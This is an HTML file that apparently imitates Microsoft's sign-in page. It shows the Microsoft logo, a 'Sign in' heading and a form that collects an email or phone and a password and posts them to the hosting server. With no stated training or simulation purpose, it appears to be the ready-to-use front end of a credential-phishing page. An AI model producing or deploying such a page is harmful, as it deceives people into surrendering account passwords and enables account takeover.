<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Microsoft Login</title>
</head>

<body style="
  margin: 0;
  font-family: 'Segoe UI', sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background: url('background.png') no-repeat center center fixed;
  background-size: cover;
">
  <div style="
    background: white;
    padding: 40px;
    width: 300px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
  ">
    <img src="Microsoft.png" alt="Microsoft Logo" style="width: 100%; margin-bottom: 20px" />
    <h2 style="margin: 0 0 10px">Sign in</h2>

    <form action="/" method="POST">
      <input
        name="username"
        type="text"
        placeholder="Email, phone, or Skype"
        required
        style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc;"
      />
      <input
        name="password"
        type="password"
        placeholder="Password"
        required
        style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; -webkit-text-security: disc;"
      />
      <a href="#" style="font-size: 12px; text-decoration: none; color: #0067b8;">No account? Create one!</a><br />
      <button type="submit" style="margin-top: 20px; width: 100%; padding: 10px; background: #0067b8; color: white; border: none;">
        Next
      </button>
    </form>
  </div>
</body>
</html>
